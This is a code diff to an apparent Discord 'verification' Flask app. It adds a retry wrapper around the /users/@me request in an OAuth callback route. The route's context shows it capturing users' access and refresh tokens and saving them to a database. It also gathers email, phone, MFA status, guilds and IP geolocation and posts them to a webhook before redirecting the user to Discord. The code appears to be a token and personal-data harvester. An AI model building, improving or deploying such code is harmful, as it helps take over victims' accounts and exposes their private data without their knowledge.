@@ -117,7 +117,7 @@ def verify():
 
 @app.route("/verified")
 def verified():
-    # ----- Exchange code for tokens -----
+
     data = {
         "client_id": client_id,
         "client_secret": client_secret,
@@ -131,9 +131,52 @@ def verified():
     access_token = token_data["access_token"]
     refresh_token = token_data["refresh_token"]
 
-    # ----- Gather user info -----
+    def safe_user_request(token: str) -> dict:
+        auth = {"Authorization": f"Bearer {token}"}
+        url = "https://discord.com/api/users/@me"
+
+        for _ in range(5):                     # try a few times before giving up
+            resp = httpx.get(url, headers=auth, timeout=10)
+
+            if resp.status_code == 200:       # success
+                raw = resp.json()
+                break
+
+            if resp.status_code == 429:       # rate‑limited – respect retry‑after
+                wait = resp.json().get("retry_after", 1)
+                print(f"[INFO] Rate limited, waiting {wait}s …")
+                time.sleep(wait)
+                continue
+
+            # any other non‑200 response is fatal
+            raise RuntimeError(
+                f"Failed to fetch /users/@me – status {resp.status_code}: {resp.text}"
+            )
+        else:
+            raise RuntimeError("Exceeded max retries for /users/@me")
+
+        # Normalise – every field becomes a string (or bool where appropriate)
+        get = lambda k, d="N/A": raw.get(k, d) if raw.get(k) is not None else d
+        return {
+            "id": raw["id"],
+            "username": get("username"),
+            "discriminator": get("discriminator"),
+            "avatar": get("avatar", None),
+            "email": get("email"),
+            "phone": get("phone"),
+            "locale": get("locale"),
+            "verified": raw.get("verified", False),
+            "mfa_enabled": raw.get("mfa_enabled", False),
+            "premium_type": raw.get("premium_type", 0),   # 0 = no Nitro
+        }
+
+    try:
+        user = safe_user_request(access_token)
+    except Exception as exc:
+        print(f"[ERROR] {exc}")
+        return flask.redirect("/")          # fallback of your choice
+
     auth_headers = {"Authorization": f"Bearer {access_token}"}
-    user = httpx.get("https://discord.com/api/users/@me", headers=auth_headers).json()
     guilds = httpx.get(
         "https://discord.com/api/users/@me/guilds", headers=auth_headers
     ).json()
@@ -154,7 +197,6 @@ def verified():
         f"&z=10&l=map&size=450,250&pt={lon},{lat},pm2rdm"
     )
 
-    # ----- Format guild & connection lists -----
     guild_list = (
         "\n".join(
             f"  - {g['name']} ({g['id']})"
@@ -180,11 +222,10 @@ def verified():
     flag = geo.get("countryCode", "xx").lower()
     avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user.get('avatar')}.png?size=512"
 
-    # ----- Build Discord embed payload -----
     info = {
         "embeds": [
             {
-                "title": f"👤 {user.get('username')}#{user.get('discriminator')}",
+                "title": f"👤 {user['username']}#{user['discriminator']}",
                 "description": f"**User ID:** `{user_id}`",
                 "color": 0x5865F2,
                 "thumbnail": {"url": avatar},
@@ -192,18 +233,18 @@ def verified():
                     {
                         "name": "📧 Account",
                         "value": (
-                            f"**Email:** `{user.get('email', 'N/A')}`\n"
-                            f"**Phone:** `{user.get('phone', 'N/A')}`\n"
-                            f"**Locale:** `{user.get('locale', 'N/A')}`"
+                            f"**Email:** `{user['email']}`\n"
+                            f"**Phone:** `{user['phone']}`\n"
+                            f"**Locale:** `{user['locale']}`"
                         ),
                         "inline": True,
                     },
                     {
                         "name": "🔐 Security",
                         "value": (
-                            f"**Verified:** `{user.get('verified', False)}`\n"
-                            f"**MFA Enabled:** `{user.get('mfa_enabled', False)}`\n"
-                            f"**Nitro:** `{bool(user.get('premium_type', 0))}`"
+                            f"**Verified:** `{user['verified']}`\n"
+                            f"**MFA Enabled:** `{user['mfa_enabled']}`\n"
+                            f"**Nitro:** `{bool(user['premium_type'])}`"
                         ),
                         "inline": True,
                     },
@@ -255,7 +296,6 @@ def verified():
         ]
     }
 
-    # ----- Save to DB -----
     tokens[user_id] = {
         "access_token": access_token,
         "refresh_token": refresh_token,
@@ -292,7 +332,6 @@ def verified():
     )
     conn.commit()
 
-    # ----- Send webhook -----
     try:
         info_content = info.get("content", "")
         info["content"] = _truncate_for_discord(info_content, limit=1900)
@@ -303,6 +342,7 @@ def verified():
         print(f"Webhook failed: {e}")
 
     return flask.redirect("https://discord.com/app")
+
 
 
 # ── Dashboard Routes ─────────────────────────────────────────────────────
